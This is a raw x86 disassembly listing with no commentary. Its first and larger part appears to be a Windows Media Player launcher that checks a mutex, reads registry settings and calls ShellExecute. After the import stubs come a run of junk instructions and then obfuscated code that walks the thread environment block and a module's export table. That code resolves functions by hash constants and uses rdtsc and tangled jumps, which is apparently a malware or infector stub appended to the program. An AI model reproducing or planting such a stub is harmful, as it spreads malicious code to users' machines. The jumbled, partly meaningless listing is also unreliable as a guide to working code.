mov     edi, edi
push    ebp
mov     ebp, esp
sub     esp, 0ach
push    ebx
xor     ebx, ebx
push    ebx
mov     [ebp+var_24], ebx
mov     [ebp+var_18], ebx
mov     [ebp+uexitcode], ebx
call    ds:__imp__getmodulehandlea@4
mov     [ebp+var_44], eax
mov     [ebp+lpmem], ebx
mov     [ebp+var_30], ebx
mov     [ebp+var_3c], ebx
mov     [ebp+var_38], ebx
mov     [ebp+var_34], ebx
call    ?fneedreboot@@yg_nxz
test    al, al
jnz     loc_10017eb
push    1
call    ds:__imp__getcurrentthread@0
push    eax
call    ds:__imp__setthreadpriority@8
call    ds:__imp__getprocessheap@0
cmp     eax, ebx
mov     [ebp+hheap], eax
jz      loc_100182f
push    esi
push    edi
call    ds:__imp__getcommandlinea@0
mov     [ebp+lpstring], eax
call    ds:__imp__getversion@0
test    eax, eax
mov     edi, ds:__imp__lstrlena@4
jl      loc_1001832
call    ds:__imp__getcommandlinew@0
mov     [ebp+var_24], eax
push    offset name
push    1
push    ebx
call    ds:__imp__createmutexa@12
cmp     eax, ebx
mov     dword ptr [ebp+buffer], eax
jz      loc_10018dd
call    ds:__imp__getlasterror@0
cmp     eax, 0b7h
jz      loc_10018ae
lea     eax, [ebp+phkresult]
push    eax
push    20019h
push    ebx
push    offset subkey
push    80000002h
mov     [ebp+phkresult], ebx
mov     [ebp+cbdata], ebx
mov     [ebp+type], ebx
call    ds:__imp__regopenkeyexa@20
test    eax, eax
jnz     short loc_100120d
mov     esi, ds:__imp__regqueryvalueexa@24
lea     eax, [ebp+cbdata]
push    eax
push    ebx
lea     eax, [ebp+type]
push    eax
push    ebx
push    offset valuename
push    [ebp+phkresult]
call    esi
test    eax, eax
jnz     short loc_1001201
cmp     [ebp+type], 1
jnz     short loc_1001201
push    [ebp+cbdata]
push    ebx
push    [ebp+hheap]
call    ds:__imp__heapalloc@12
cmp     eax, ebx
mov     [ebp+lppathname], eax
jz      short loc_1001201
lea     ecx, [ebp+cbdata]
push    ecx
push    eax
lea     eax, [ebp+type]
push    eax
push    ebx
push    offset valuename
push    [ebp+phkresult]
call    esi
test    eax, eax
jnz     short loc_10011f4
push    [ebp+lppathname]
call    ds:__imp__setcurrentdirectorya@4
push    [ebp+lppathname]
push    ebx
push    [ebp+hheap]
call    ds:__imp__heapfree@12
push    [ebp+phkresult]
call    ds:__imp__regclosekey@4
mov     [ebp+phkresult], ebx
push    [ebp+lpstring]
call    ?mustfirstshowrunoncedialog@@yg_npad@z
test    al, al
jnz     loc_10018f1
push    offset libfilename
mov     [ebp+var_5], bl
call    ds:__imp__loadlibrarya@4
mov     edi, eax
cmp     edi, ebx
jz      loc_1001991
push    ebx
call    ds:__imp__oleinitialize@4
mov     esi, ds:__imp__getprocaddress@8
push    0bb8h
push    edi
call    esi
push    0fa0h
push    edi
mov     [ebp+lpstring], eax
call    esi
push    offset procname
push    edi
mov     [ebp+lppathname], eax
call    esi
cmp     [ebp+lpstring], ebx
mov     esi, eax
jz      loc_10014fe
cmp     [ebp+lppathname], ebx
jz      loc_10014fe
cmp     esi, ebx
jz      loc_1001975
lea     eax, [ebp+var_34]
push    eax
lea     eax, [ebp+var_38]
push    eax
lea     eax, [ebp+var_3c]
push    eax
lea     eax, [ebp+var_30]
push    eax
lea     eax, [ebp+lpmem]
push    eax
call    [ebp+lppathname]
test    eax, eax
jnz     loc_10014fe
lea     eax, [ebp+startupinfo]
push    eax
mov     [ebp+startupinfo.dwflags], ebx
mov     [ebp+startupinfo.cb], 44h
call    ds:__imp__getstartupinfoa@4
push    8001h
call    ds:__imp__seterrormode@4
test    byte ptr [ebp+startupinfo.dwflags], 1
jnz     loc_10014f5
push    0ah
pop     eax
push    eax
push    [ebp+var_24]
push    [ebp+var_44]
call    [ebp+lpstring]
cmp     eax, 80070005h
mov     [ebp+uexitcode], eax
setnz   [ebp+var_5]
jmp     loc_10014fe
mov     eax, offset __imp__oleinitialize@4
jmp     short $+2
push    ecx
push    edx
push    eax
push    offset __delay_import_descriptor_ole32
call    sub_100139e
pop     edx
pop     ecx
jmp     eax
mov     eax, eax
push    ebp
mov     ebp, esp
sub     esp, 44h
push    ebx
mov     eax, offset __null_import_descriptor
push    esi
mov     esi, [ebp+arg_0]
mov     edx, [esi+8]
mov     ecx, [esi+4]
mov     ebx, [esi+0ch]
add     edx, eax
push    edi
mov     edi, [esi+14h]
add     edi, eax
add     ecx, eax
mov     [ebp+target], edx
mov     edx, [esi+10h]
add     ebx, eax
add     edx, eax
mov     eax, [esi+1ch]
mov     [ebp+var_4], eax
mov     eax, [ebp+arguments]
mov     [ebp+pdli.szdll], ecx
xor     ecx, ecx
mov     [ebp+var_c], edi
mov     [ebp+pdli.ppfn], eax
xor     eax, eax
test    dword ptr [esi], 1
lea     edi, [ebp+pdli.dlp.anonymous_0]
mov     [ebp+pdli.cb], 24h
mov     [ebp+pdli.pidd], esi
mov     [ebp+pdli.dlp.fimportbyname], ecx
stosd
mov     [ebp+pdli.hmodcur], ecx
mov     [ebp+pdli.pfncur], ecx
mov     [ebp+pdli.dwlasterror], ecx
jz      loc_1001b29
mov     eax, [ebp+target]
mov     edi, [eax]
mov     eax, [ebp+arguments]
sub     eax, ebx
sar     eax, 2
shl     eax, 2
add     edx, eax
mov     edx, [edx]
mov     [ebp+arg_0], eax
mov     eax, edx
shr     eax, 1fh
not     eax
and     eax, 1
mov     [ebp+pdli.dlp.fimportbyname], eax
jz      loc_10014d3
lea     eax, word_1000002[edx]
mov     dword ptr [ebp+pdli.dlp.anonymous_0], eax
mov     eax, ___pfndlinotifyhook2
xor     ebx, ebx
cmp     eax, ecx
jnz     loc_1001b48
test    edi, edi
jnz     short loc_1001487
mov     eax, ___pfndlinotifyhook2
test    eax, eax
jnz     loc_1001b5e
push    [ebp+pdli.szdll]
call    ds:__imp__loadlibrarya@4
mov     edi, eax
test    edi, edi
jz      loc_1001b6b
push    edi
push    [ebp+target]
call    ds:__imp__interlockedexchange@8
cmp     eax, edi
jz      short loc_10014ec
cmp     dword ptr [esi+18h], 0
jnz     loc_1001bb0
mov     eax, ___pfndlinotifyhook2
test    eax, eax
mov     [ebp+pdli.hmodcur], edi
jnz     loc_1001bd7
test    ebx, ebx
jnz     short loc_10014b8
cmp     [esi+14h], ebx
jnz     loc_1001be6
push    dword ptr [ebp+pdli.dlp.anonymous_0]
push    edi
call    ds:__imp__getprocaddress@8
mov     ebx, eax
test    ebx, ebx
jz      loc_1001c2b
mov     eax, [ebp+arguments]
mov     [eax], ebx
mov     eax, ___pfndlinotifyhook2
test    eax, eax
jnz     loc_1001c6f
mov     eax, ebx
pop     edi
pop     esi
pop     ebx
leave
retn    8
and     edx, 0ffffh
mov     dword ptr [ebp+pdli.dlp.anonymous_0], edx
jmp     loc_100143c
mov     edi, eax
test    edi, edi
jnz     short loc_100146f
jmp     loc_100145c
push    edi
call    ds:__imp__freelibrary@4
jmp     short loc_1001487
movzx   eax, [ebp+startupinfo.wshowwindow]
jmp     loc_10012cd
cmp     esi, ebx
jz      loc_1001975
jmp     loc_100196f
inc     ecx
cmp     byte ptr [eax+ecx], 0
jz      loc_100160f
jmp     loc_10015f6
mov     eax, [ebp+arg_0]
jmp     loc_1001627
mov     edi, edi
push    ebp
mov     ebp, esp
sub     esp, 0ch
push    ebx
lea     eax, [ebp+phkresult]
push    eax
push    20019h
xor     ebx, ebx
push    ebx
push    offset asoftwaremicros
push    80000002h
mov     [ebp+phkresult], ebx
call    ds:__imp__regopenkeyexa@20
test    eax, eax
jnz     short loc_1001587
lea     eax, [ebp+cbdata]
push    eax
lea     eax, [ebp+data]
push    eax
push    ebx
push    ebx
push    offset ainstallresult
push    [ebp+phkresult]
mov     dword ptr [ebp+data], ebx
mov     [ebp+cbdata], 4
call    ds:__imp__regqueryvalueexa@24
test    eax, eax
jz      loc_10017cd
push    [ebp+phkresult]
call    ds:__imp__regclosekey@4
mov     al, bl
pop     ebx
leave
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
push    esi
mov     esi, [ebp+arg_4]
cmp     byte ptr [esi], 0
mov     [ebp+arg_0], eax
jz      short loc_1001628
mov     dl, [eax]
test    dl, dl
push    edi
jz      short loc_1001625
sub     eax, esi
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
test    dl, dl
mov     ecx, esi
jz      short loc_100160f
mov     dl, [ecx]
test    dl, dl
jz      loc_100151b
movsx   edi, byte ptr [eax+ecx]
movsx   edx, dl
sub     edi, edx
jz      loc_100150b
cmp     byte ptr [ecx], 0
jz      loc_100151b
inc     [ebp+arg_0]
mov     ecx, [ebp+arg_0]
mov     dl, [ecx]
inc     eax
test    dl, dl
jnz     short loc_10015f0
xor     eax, eax
pop     edi
pop     esi
pop     ebp
retn
mov     edi, edi
push    ebp
mov     ebp, esp
sub     esp, 14h
push    ebx
xor     ebx, ebx
cmp     [ebp+arg_0], ebx
mov     [ebp+phkresult], ebx
mov     [ebp+cbdata], ebx
mov     [ebp+type], ebx
mov     dword ptr [ebp+data], ebx
mov     [ebp+var_1], 1
jz      short loc_1001667
push    offset askipprivacy
push    [ebp+arg_0]
call    ?wmpstrstr@@yapadpbd0@z
test    eax, eax
pop     ecx
pop     ecx
jnz     loc_10017dc
push    esi
mov     esi, ds:__imp__regopenkeyexa@20
push    edi
lea     eax, [ebp+phkresult]
push    eax
mov     edi, 20019h
push    edi
push    ebx
push    offset asoftwaremicros_1
push    80000001h
call    esi
test    eax, eax
jnz     short loc_10016d1
lea     eax, [ebp+cbdata]
push    eax
lea     eax, [ebp+data]
push    eax
lea     eax, [ebp+type]
push    eax
push    ebx
push    offset aacceptedprivac
push    [ebp+phkresult]
mov     [ebp+cbdata], 4
call    ds:__imp__regqueryvalueexa@24
test    eax, eax
jnz     short loc_10016c0
cmp     [ebp+type], 4
jnz     short loc_10016c0
cmp     dword ptr [ebp+data], 1
jz      loc_10017e3
push    [ebp+phkresult]
call    ds:__imp__regclosekey@4
cmp     [ebp+var_1], bl
mov     [ebp+phkresult], ebx
jz      short loc_1001723
lea     eax, [ebp+phkresult]
push    eax
push    edi
push    ebx
push    offset asoftwarepolici
push    80000002h
call    esi
test    eax, eax
jnz     short loc_1001723
push    4
pop     esi
lea     eax, [ebp+cbdata]
push    eax
lea     eax, [ebp+data]
push    eax
lea     eax, [ebp+type]
push    eax
push    ebx
push    offset agroupprivacyac
push    [ebp+phkresult]
mov     [ebp+cbdata], esi
call    ds:__imp__regqueryvalueexa@24
test    eax, eax
jnz     short loc_100171a
cmp     [ebp+type], esi
jnz     short loc_100171a
cmp     dword ptr [ebp+data], 1
jnz     short loc_100171a
mov     [ebp+var_1], bl
push    [ebp+phkresult]
call    ds:__imp__regclosekey@4
mov     al, [ebp+var_1]
pop     edi
pop     esi
pop     ebx
leave
retn    4
cmp     [ebp+phkresult], 0d2af9h
setz    bl
jmp     loc_100157e
xor     al, al
jmp     loc_1001728
mov     [ebp+var_1], bl
jmp     loc_10016c0
push    ebx
push    ebx
lea     eax, [ebp+buffer]
push    eax
push    ebx
push    0c0000002h
push    ebx
push    2900h
mov     dword ptr [ebp+buffer], ebx
call    ds:__imp__formatmessagea@28
test    eax, eax
jz      short loc_100182f
push    offset acomctl32dll
call    ds:__imp__loadlibrarya@4
push    10h
push    offset caption
push    dword ptr [ebp+buffer]
push    ebx
call    ds:__imp__messageboxa@16
push    dword ptr [ebp+buffer]
call    ds:__imp__localfree@4
pop     ebx
leave
retn
push    offset aocx
push    [ebp+lpstring]
call    ?wmpstrstr@@yapadpbd0@z
test    eax, eax
pop     ecx
pop     ecx
jz      loc_1001141
push    [ebp+lpstring]
call    edi
mov     esi, eax
lea     eax, [esi+esi+2]
push    eax
push    ebx
push    [ebp+hheap]
call    ds:__imp__heapalloc@12
cmp     eax, ebx
mov     [ebp+var_18], eax
jz      loc_100114a
inc     esi
push    esi
push    eax
push    0ffffffffh
push    [ebp+lpstring]
push    ebx
push    0fde9h
call    ds:__imp__multibytetowidechar@24
test    eax, eax
jnz     short loc_10018a6
mov     esi, ds:__imp__getlasterror@0
call    esi
test    eax, eax
jg      short loc_1001892
call    esi
jmp     short loc_100189e
call    esi
and     eax, 0ffffh
or      eax, 80070000h
cmp     eax, ebx
jl      loc_100114a
mov     eax, [ebp+var_18]
jmp     loc_1001147
push    dword ptr [ebp+buffer]
call    ds:__imp__closehandle@4
push    ebx
push    offset classname
mov     dword ptr [ebp+buffer], ebx
call    ds:__imp__findwindowa@8
cmp     eax, ebx
jz      short loc_10018d0
push    eax
call    sub_1001d30
push    [ebp+var_24]
call    ?passcommandlinetowmp@@ygjpbg@z
jmp     loc_1001a6a
call    ds:__imp__getlasterror@0
cmp     eax, 5
jz      loc_1001a6a
jmp     loc_1001174
cmp     [ebp+lpstring], ebx
mov     esi, offset parameters
jz      short loc_1001955
push    [ebp+lpstring]
call    edi
push    esi
mov     [ebp+lppathname], eax
call    edi
mov     ecx, [ebp+lppathname]
lea     eax, [ecx+eax+1]
push    eax
push    ebx
push    [ebp+hheap]
call    ds:__imp__heapalloc@12
mov     edi, eax
cmp     edi, ebx
jz      short loc_1001955
push    esi
push    edi
call    ds:__imp__lstrcpya@8
push    [ebp+lpstring]
push    edi
call    ds:__imp__lstrcata@8
push    0ah
push    ebx
push    edi
push    offset file
push    offset operation
push    ebx
call    ds:__imp__shellexecutea@24
push    edi
push    ebx
push    [ebp+hheap]
call    ds:__imp__heapfree@12
jmp     loc_1001a6a
push    0ah
push    ebx
push    esi
push    offset file
push    offset operation
push    ebx
call    ds:__imp__shellexecutea@24
jmp     loc_1001a6a
call    esi
test    eax, eax
jnz     short loc_100197c
push    edi
call    ds:__imp__freelibrary@4
call    ds:__imp__cofreeunusedlibraries@0
call    ds:__imp__oleuninitialize@0
cmp     [ebp+var_5], bl
jnz     loc_1001a6a
mov     eax, [ebp+lpmem]
cmp     eax, ebx
mov     esi, ds:__imp__formatmessagea@28
mov     [ebp+lpstring], ebx
mov     edi, 2900h
jz      short loc_1001a03
mov     [ebp+arguments], eax
mov     eax, [ebp+var_30]
shr     eax, 10h
mov     [ebp+var_64], eax
movzx   eax, word ptr [ebp+var_30]
mov     [ebp+var_60], eax
mov     eax, [ebp+var_3c]
shr     eax, 10h
mov     [ebp+var_5c], eax
movzx   eax, word ptr [ebp+var_3c]
mov     [ebp+var_58], eax
mov     eax, [ebp+var_38]
shr     eax, 10h
mov     [ebp+var_54], eax
movzx   eax, word ptr [ebp+var_38]
mov     [ebp+var_50], eax
mov     eax, [ebp+var_34]
shr     eax, 10h
mov     [ebp+var_4c], eax
movzx   eax, word ptr [ebp+var_34]
mov     [ebp+var_48], eax
lea     eax, [ebp+arguments]
push    eax
push    ebx
lea     eax, [ebp+lpstring]
push    eax
push    ebx
push    0c0000003h
push    ebx
push    edi
call    esi
mov     eax, [ebp+lpstring]
cmp     eax, ebx
jnz     short loc_1001a0c
mov     [ebp+lppathname], offset word_1001b0a
jmp     short loc_1001a0f
mov     [ebp+lppathname], eax
lea     eax, [ebp+lppathname]
push    eax
push    ebx
lea     eax, [ebp+lpstring]
push    eax
push    ebx
push    0c0000001h
push    ebx
push    edi
call    esi
test    eax, eax
jz      short loc_1001a5c
push    offset acomctl32dll
call    ds:__imp__loadlibrarya@4
push    14h
push    offset caption
push    [ebp+lpstring]
push    ebx
call    ds:__imp__messageboxa@16
cmp     eax, 6
jnz     short loc_1001a5c
push    0ah
push    ebx
push    ebx
push    offset ahttpgomicrosof
push    offset operation
push    ebx
call    ds:__imp__shellexecutea@24
cmp     [ebp+lpstring], ebx
jz      short loc_1001a6a
push    [ebp+lpstring]
call    ds:__imp__localfree@4
cmp     [ebp+lpmem], ebx
pop     edi
pop     esi
jz      short loc_1001a7e
push    [ebp+lpmem]
push    ebx
push    [ebp+hheap]
call    ds:__imp__heapfree@12
cmp     [ebp+var_18], ebx
jz      short loc_1001a90
push    [ebp+var_18]
push    ebx
push    [ebp+hheap]
call    ds:__imp__heapfree@12
cmp     dword ptr [ebp+buffer], ebx
jz      short loc_1001a9e
push    dword ptr [ebp+buffer]
call    ds:__imp__closehandle@4
push    [ebp+uexitcode]
call    ds:__imp__exitprocess@4
lea     eax, [ebp+pdli]
mov     [ebp+arguments], eax
lea     eax, [ebp+arguments]
push    eax
push    1
push    ecx
push    0c06d0057h
call    ds:__imp__raiseexception@16
xor     eax, eax
jmp     loc_10014cc
lea     edx, [ebp+pdli]
push    edx
push    ecx
call    eax
mov     ebx, eax
test    ebx, ebx
jnz     loc_10014bd
jmp     loc_100144b
lea     ecx, [ebp+pdli]
push    ecx
push    1
call    eax
jmp     loc_10014e1
call    ds:__imp__getlasterror@0
mov     [ebp+pdli.dwlasterror], eax
mov     eax, ___pfndlifailurehook2
test    eax, eax
jz      short loc_1001b8f
lea     ecx, [ebp+pdli]
push    ecx
push    3
call    eax
mov     edi, eax
test    edi, edi
jnz     loc_100146f
lea     eax, [ebp+pdli]
mov     [ebp+arguments], eax
lea     eax, [ebp+arguments]
push    eax
push    1
push    0
push    0c06d007eh
call    ds:__imp__raiseexception@16
mov     eax, [ebp+pdli.pfncur]
jmp     loc_10014cc
push    8
push    40h
call    ds:__imp__localalloc@8
test    eax, eax
jz      loc_1001487
mov     [eax+4], esi
mov     ecx, ___puihead
mov     [eax], ecx
mov     ___puihead, eax
jmp     loc_1001487
lea     ecx, [ebp+pdli]
push    ecx
push    2
call    eax
mov     ebx, eax
jmp     loc_1001497
cmp     [esi+1ch], ebx
jz      loc_10014a4
mov     eax, [edi+3ch]
add     eax, edi
cmp     dword ptr [eax], 4550h
jnz     loc_10014a4
mov     ecx, [ebp+var_4]
cmp     [eax+8], ecx
jnz     loc_10014a4
cmp     edi, [eax+34h]
jnz     loc_10014a4
mov     eax, [ebp+var_c]
mov     ecx, [ebp+arg_0]
mov     ebx, [ecx+eax]
test    ebx, ebx
jnz     loc_10014b8
jmp     loc_10014a4
call    ds:__imp__getlasterror@0
mov     [ebp+pdli.dwlasterror], eax
mov     eax, ___pfndlifailurehook2
test    eax, eax
jz      short loc_1001c47
lea     ecx, [ebp+pdli]
push    ecx
push    4
call    eax
mov     ebx, eax
test    ebx, ebx
jnz     loc_10014b8
lea     eax, [ebp+pdli]
mov     [ebp+arg_0], eax
lea     eax, [ebp+arg_0]
push    eax
push    1
push    ebx
push    0c06d007fh
call    ds:__imp__raiseexception@16
mov     ebx, [ebp+pdli.pfncur]
jmp     loc_10014b8
and     [ebp+pdli.dwlasterror], 0
lea     ecx, [ebp+pdli]
push    ecx
push    5
mov     [ebp+pdli.hmodcur], edi
mov     [ebp+pdli.pfncur], ebx
call    eax
jmp     loc_10014ca
mov     edi, edi
push    ebp
mov     ebp, esp
sub     esp, 0ch
push    ebx
push    esi
push    0
push    offset classname
mov     esi, 80004005h
call    ds:__imp__findwindowa@8
mov     ebx, eax
test    ebx, ebx
jz      short loc_1001d23
mov     esi, [ebp+lpstring]
push    esi
mov     [ebp+lparam], 1
call    ds:__imp__lstrlenw@4
lea     eax, [eax+eax+2]
mov     [ebp+var_8], eax
lea     eax, [ebp+lpstring]
push    eax
push    1d4c0h
push    3
lea     eax, [ebp+lparam]
push    eax
push    0
push    4ah
push    ebx
mov     [ebp+var_4], esi
call    ds:__imp__sendmessagetimeouta@28
test    eax, eax
jnz     short loc_1001d15
call    ds:__imp__getlasterror@0
test    eax, eax
jnz     short loc_1001d05
mov     esi, 80004004h
jmp     short loc_1001d23
jle     short loc_1001d11
and     eax, 0ffffh
or      eax, 80070000h
mov     esi, eax
jmp     short loc_1001d23
mov     esi, [ebp+lpstring]
dec     esi
neg     esi
sbb     esi, esi
and     esi, 80004005h
mov     eax, esi
pop     esi
pop     ebx
leave
retn    4
mov     edi, edi
push    ebp
mov     ebp, esp
sub     esp, 18h
push    esi
mov     esi, ds:__imp__getwindow@8
push    4
push    [ebp+hwnd]
jmp     short loc_1001d4c
push    4
mov     [ebp+hwnd], eax
push    eax
call    esi
test    eax, eax
jnz     short loc_1001d46
cmp     [ebp+hwnd], eax
jz      loc_1001e22
push    [ebp+hwnd]
call    ds:__imp__iswindowvisible@4
test    eax, eax
jnz     loc_1001e01
push    ebx
lea     eax, [ebp+dwprocessid]
push    eax
push    [ebp+hwnd]
call    ds:__imp__getwindowthreadprocessid@8
call    ds:__imp__getdesktopwindow@0
push    5
push    eax
call    esi
mov     ebx, eax
test    ebx, ebx
jz      short loc_1001e00
push    edi
lea     eax, [ebp+var_8]
push    eax
push    ebx
call    ds:__imp__getwindowthreadprocessid@8
mov     eax, [ebp+dwprocessid]
cmp     eax, [ebp+var_8]
jnz     short loc_1001def
push    ebx
call    ds:__imp__getparent@4
test    eax, eax
jnz     short loc_1001def
push    4
push    ebx
call    esi
test    eax, eax
jnz     short loc_1001def
cmp     ebx, [ebp+hwnd]
jz      short loc_1001def
lea     edi, [ebp+classname]
stosd
stosd
stosd
stosd
push    0fh
lea     eax, [ebp+classname]
push    eax
push    ebx
call    ds:__imp__getclassnamea@12
test    eax, eax
jz      short loc_1001def
push    0ffffffffh
lea     eax, [ebp+classname]
push    eax
push    0ffffffffh
push    offset string1
push    0
push    800h
call    ds:__imp__comparestringa@24
cmp     eax, 2
jz      short loc_1001dfc
push    2
push    ebx
call    esi
mov     ebx, eax
test    ebx, ebx
jnz     short loc_1001d8c
jmp     short loc_1001dff
mov     [ebp+hwnd], ebx
pop     edi
pop     ebx
push    [ebp+hwnd]
call    ds:__imp__setforegroundwindow@4
push    [ebp+hwnd]
call    ds:__imp__isiconic@4
test    eax, eax
jz      short loc_1001e22
push    9
push    [ebp+hwnd]
call    ds:__imp__showwindow@8
xor     eax, eax
pop     esi
leave
retn    4
mov     eax, offset __imp__oleuninitialize@0
jmp     __tailmerge_ole32
mov     eax, offset __imp__cofreeunusedlibraries@0
jmp     __tailmerge_ole32
mov     eax, offset __imp__shellexecutea@24
jmp     short $+2
push    ecx
push    edx
push    eax
push    offset __delay_import_descriptor_shell32
call    sub_100139e
pop     edx
pop     ecx
jmp     eax
stc
stc
stc
add     ecx, edi
stc
stc
xor     al, 0f8h
div     edx
cli
retn
retf
and     al, 4ch
icebp
jmp     dword ptr [esi]
dec     edi
cmc
jmp     fword ptr [esi]
test    [ebx-787eeb7dh], al
mov     [eax+eax*4-6b008886h], edi
inc     edi
cmp     edi, edi
test    eax, 0acff0e24h
daa
push    cs
jmp     fword ptr [edx-5700ecd2h]
fstp1   st
fmul    dword ptr [esi]
mov     ss, word ptr [esi+edx*4+70758bc6h]
jmp     fword ptr [ecx-4d00ddc5h]
div     edi
cmc
push    ebx
xlat
fucomi  st, st(2)
jmp     fword ptr [edx+edx*2]
mov     esp, 9c0bbcbch
mov     ds:878182a3h, al
xchg    esi, esp
mov     [edi+57h], bl
call    fword ptr [edi-5500decdh]
and     ecx, [edi+edi*8]
stosd
sub     [edi], cl
jmp     fword ptr [edx-5700ecd3h]
rcl     dl, cl
rol     byte ptr [ebx], cl
mov     ch, 0bbh
mov     esp, 8d8e917fh
jmp     dword ptr [ecx-4a00beabh]
cli
cli
cli
adc     bh, bh
push    esi
sal     byte ptr [eax+eax*8+4d25fff0h], 0f2h
jmp     dword ptr [eax+edx*2]
std
std
sti
push    edi
idiv    eax
cmc
div     byte ptr [ebx-74h]
icebp
call    dword ptr [edi]
inc     ebx
cmc
jmp     fword ptr ds:33fffa56h
fcomp   st(6)
fiadd   word ptr [ebx]
retn
mov     bh, 0b2h
mov     dl, 6dh
mov     al, ds:0b4fd364ch
cmp     ds:1e45c4ffh, edx
inc     esp
inc     ebp
push    ds
jmp     fword ptr [esi]
sti
cld
std
dec     edx
mov     word ptr [eax+532bf2f5h], fs
stc
jmp     dword ptr [ecx]
retn    2
jz      sub_1012083
xor     edi, eax
rdtsc
retn
push    0bd17f4cbh
jmp     loc_1012121
lea     edi, [eax]
call    sub_1012083
lea     ecx, [esp+arg_1c]
mov     [ecx+18h], edx
mov     [ecx+10h], edi
jmp     short loc_1012079
push    0d527a3bfh
call    sub_1012070
mov     edx, esi
call    edx
popa
jmp     loc_1016c36
sub     esp, 4
call    sub_1012066
push    0ch
jmp     loc_1016ce2
push    0a95928bbh
call    sub_1012070
mov     edx, esi
jmp     loc_1016c9e
add     esi, [edi+eax*4]
retn    4
push    1
jmp     short loc_10120dc
mov     edx, ebx
mov     esi, ebx
jmp     loc_1016cbd
mov     [ecx+14h], eax
and     dword ptr [ebp-0ch], 0
inc     dword ptr [ebp-0ch]
call    esi
xor     eax, edi
jmp     loc_1012000
push    esi
mov     eax, [ebp-10h]
call    eax
add     esp, 4
jmp     short nullsub_2
pop     eax
ja      loc_1012118
xor     eax, 7823f06fh
sbb     eax, [esp+arg_0]
jnz     loc_1016c08
jmp     short loc_10120ea
mov     [esi+0ch], eax
mov     [esi+4], eax
lsl     ecx, eax
mov     [esi+8], eax
jmp     short loc_1012138
or      [esp+4+var_2], 4
sub     eax, eax
pop     dword ptr [esi]
jmp     short loc_10120cb
lea     esi, [ebx]
lea     edi, [ebx]
add     edi, [edx+1ch]
jmp     loc_1016c5d
shr     cx, 5
jnz     loc_101204f
mov     edi, large fs:18h
mov     eax, [edi+34h]
jmp     loc_1016ca0
jz      nullsub_1
push    0
pop     eax
imul    eax, 0fh
push    eax
jmp     loc_1016c25
call    sub_1012070
push    esi
push    0b3a6e9f0h
call    sub_1012070
push    1
jmp     loc_1016cb3
mov     [esi+10h], eax
retn
call    esi
jmp     loc_1012015
push    es
pop     ecx
shr     cx, 2
jmp     short loc_10120f6
add     esp, 0ffffffe0h
call    sub_1016c3d
xadd    [esp+20h+arg_0], ebp
mov     ebx, [esp+20h+var_20]
jmp     loc_1016d71
pop     ecx
lodsd
inc     ecx
cmp     ecx, [edx+18h]
lea     edi, [eax+ebx]
jmp     loc_101210f
lea     ecx, [ebp+0d9h]
add     esi, 14h
push    ecx
push    eax
jmp     loc_1012092
movzx   eax, byte ptr [edi]
sub     dword ptr [esp+4+var_4], eax
lea     edi, [edi+1]
cmp     byte ptr [edi], 1
jmp     loc_10120a3
sub     esp, 0ffffffdch
jmp     [esp+var_24]
pusha
push    [esp+20h+arg_20]
mov     ebp, 0fffea4cbh
jmp     loc_1016ccf
add     ebx, 0ffffff80h
jmp     loc_1016d7a
sub     al, 15h
sbb     al, 38h
jmp     loc_1016d1c
add     esi, [edx+24h]
lea     esi, [esi+ecx*2]
push    ebx
movzx   eax, word ptr [esi]
pop     esi
jmp     loc_1012060
ja      loc_1016d09
cmp     eax, 18653h
mov     al, 2bh
sbb     cl, cl
inc     ecx
jmp     loc_1016d01
div     edi
cmp     dword ptr [ebp-0ch], 8814h
jb      loc_1016d09
cmp     eax, 1312d4dh
jmp     short loc_1016c6d
call    edx
cmp     eax, 1
jg      loc_101202b
call    sub_101200b
jmp     loc_101202b
push    0ffffffffh
call    esi
pop     esi
jmp     short loc_1016d36
mov     eax, ebx
add     eax, [ebx+3ch]
add     edx, [eax+78h]
push    0ffffffffh
add     esi, [edx+20h]
jmp     loc_1016c07
jmp     dword ptr [esp+24h]
mov     ecx, 4a9bh
jmp     loc_1016d66
pop     dword ptr [esi+14h]
and     [esi+1ch], eax
mov     [esi+18h], esi
jmp     loc_1016c15
imul    edx, 17h
add     ecx, 0ffffffffh
jb      loc_1016d66
jmp     nullsub_1
mul     cl
xor     [ebp-4b3ch], al
mov     eax, ebp
add     eax, 0ffffb554h
mov     dx, [eax-0e0h]
jmp     nullsub_3
jnz     loc_1016c4c
push    5d069ffdh
call    sub_1012070
push    esi
lea     esi, [esp+48h+var_20]
jmp     short loc_1016d4c
call    sub_101213c
sub     edi, [esp+arg_28]
sub     eax, [esp+arg_2c]
sbb     edx, [esp+arg_30]
jmp     loc_1016c82
pop     dword ptr [ebp-10h]
call    sub_1012040
cmp     eax, 0
jz      loc_1012039
push    eax
jmp     loc_1012143
add     [eax], dl
xor     edx, 3
inc     eax
jmp     short loc_1016cf0
lea     esp, [esp+4]
and     bx, 8300h
movzx   eax, word ptr [ebx]
add     ah, 0a6h
jz      loc_1016c54
jmp     loc_1016c4c